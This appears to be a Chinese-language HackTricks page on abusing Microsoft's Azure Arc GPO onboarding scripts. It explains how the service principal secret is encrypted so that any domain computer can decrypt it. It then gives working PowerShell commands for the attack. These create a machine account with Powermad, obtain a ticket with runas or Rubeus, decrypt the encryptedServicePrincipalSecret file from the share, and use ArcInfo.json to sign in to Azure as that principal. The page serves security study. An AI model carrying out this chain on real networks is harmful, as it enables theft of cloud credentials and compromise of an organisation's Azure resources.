# Az - Arc 漏洞 GPO 部署脚本

{{#include ../../../banners/hacktricks-training.md}}

### 识别问题

Azure Arc 允许通过组策略对象方法将新的内部服务器（加入域的服务器）集成到 Azure Arc 中。为此，Microsoft 提供了一个部署工具包，用于启动入驻程序。在 ArcEnableServerGroupPolicy.zip 文件中，可以找到以下脚本：DeployGPO.ps1、EnableAzureArc.ps1 和 AzureArcDeployment.psm1。

执行 DeployGPO.ps1 脚本时，会执行以下操作：

1. 在本地域内创建 Azure Arc 服务器入驻 GPO。
2. 将 EnableAzureArc.ps1 入驻脚本复制到为入驻过程创建的指定网络共享中，该共享还包含 Windows 安装程序包。

运行此脚本时，系统管理员需要提供两个主要参数：**ServicePrincipalId** 和 **ServicePrincipalClientSecret**。此外，还需要其他参数，例如域、托管共享的服务器的 FQDN 和共享名称。还必须向脚本提供租户 ID、资源组和其他必要信息等详细信息。

在指定共享的 AzureArcDeploy 目录中使用 DPAPI-NG 加密生成一个加密的秘密。加密的秘密存储在名为 encryptedServicePrincipalSecret 的文件中。可以在 DeployGPO.ps1 脚本中找到证据，其中通过调用 ProtectBase64 以 $descriptor 和 $ServicePrincipalSecret 作为输入来执行加密。描述符由域计算机和域控制器组 SID 组成，确保 ServicePrincipalSecret 只能由域控制器和域计算机安全组解密，如脚本注释中所述。
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### 利用

我们有以下条件：

1. 我们已经成功渗透了内部网络。
2. 我们有能力在 Active Directory 中创建或控制计算机帐户。
3. 我们发现了一个包含 AzureArcDeploy 目录的网络共享。

在 AD 环境中获取计算机帐户有几种方法。最常见的方法之一是利用计算机帐户配额。另一种方法涉及通过易受攻击的 ACL 或各种其他错误配置来破坏计算机帐户。
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
一旦获得机器账户，就可以使用该账户进行身份验证。我们可以使用带有 netonly 标志的 runas.exe 命令，或者使用 Rubeus.exe 进行票证传递。
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
通过将计算机帐户的 TGT 存储在内存中，我们可以使用以下脚本解密服务主体密钥。
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
另外，我们可以使用 [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG)。

此时，我们可以从存储在与 encryptedServicePrincipalSecret 文件相同的网络共享上的 ArcInfo.json 文件中收集连接到 Azure 所需的其余信息。该文件包含以下详细信息：TenantId、servicePrincipalClientId、ResourceGroup 等。凭借这些信息，我们可以使用 Azure CLI 以被攻陷的服务主体身份进行身份验证。

## References

- [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{{#include ../../../banners/hacktricks-training.md}}
